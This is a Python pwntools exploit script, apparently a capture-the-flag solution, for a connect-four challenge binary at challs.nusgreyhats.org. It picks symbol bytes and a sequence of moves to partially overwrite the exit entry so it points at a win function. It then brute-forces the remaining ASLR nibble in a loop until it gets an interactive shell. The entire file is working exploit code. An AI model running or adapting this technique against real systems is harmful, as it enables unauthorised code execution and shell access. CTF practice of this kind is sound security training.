from pwn import *

exe = ELF("./infinite_connect_four_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

win_addr = exe.symbols['win']


def set_symbol(r, p1, p2):
    r.sendlineafter(b'symbol > ', p1)
    r.sendlineafter(b'symbol > ', p2)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.nusgreyhats.org", 33102)

    return r

def overwrite_exit_last_byte(r):
    win_last_byte = win_addr & 0xff
    second_last_byte = win_addr.to_bytes(8, 'little')[1]
    set_symbol(r, bytes([win_last_byte]), bytes([second_last_byte]))

    for _ in range(16):
            r.sendlineafter(b"> ", b"0")
    r.sendlineafter(b"> ", b"2")
    for _ in range(16):
            r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", b"9")


def brute_force_half_byte():
    while True:
        r = conn()
        overwrite_exit_last_byte(r)
        try:
            r.sendline(b"id")
            r.recvuntil(b"uid")
            r.interactive()
        except:
            print("Connection failed, retrying...")
            r.close()
            continue


if __name__ == '__main__':
    brute_force_half_byte()